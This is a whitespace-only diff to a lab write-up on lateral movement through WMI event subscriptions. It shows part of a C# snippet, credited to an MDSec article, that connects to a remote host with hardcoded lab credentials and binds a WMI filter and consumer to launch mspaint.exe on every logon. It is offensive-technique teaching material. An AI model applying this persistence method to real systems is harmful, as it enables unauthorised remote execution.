@@ -20,7 +20,7 @@ The below C# code for WMI events based lateral movement does a couple of things:
 | 55 - 58                           | WMI filter `evilSpotlessFilter` and WMI consumer `evilSpotlessConsumer` are bound. In layman's terms, the system `192.168.56.105` is instructed to **DEFINITELY** fire `mspaint.exe` on each new logon session that is created on the system.                                      |
 
 ```csharp
-// code completely stolen from @domchell article 
+// code completely stolen from @domchell article
 // https://www.mdsec.co.uk/2020/09/i-like-to-move-it-windows-lateral-movement-part-1-wmi-event-subscription/
 // slightly modified to accommodate this lab
 
@@ -44,11 +44,11 @@ namespace wmisubscription_lateralmovement
             ConnectionOptions cOption = new ConnectionOptions();
             ManagementScope scope = null;
             scope = new ManagementScope(NAMESPACE, cOption);
-            
+
             scope.Options.Username = "spotless";
             scope.Options.Password = "123456";
             scope.Options.Authority = string.Format("ntlmdomain:{0}", ".");
-            
+
             scope.Options.EnablePrivileges = true;
             scope.Options.Authentication = AuthenticationLevel.PacketPrivacy;
             scope.Options.Impersonation = ImpersonationLevel.Impersonate;
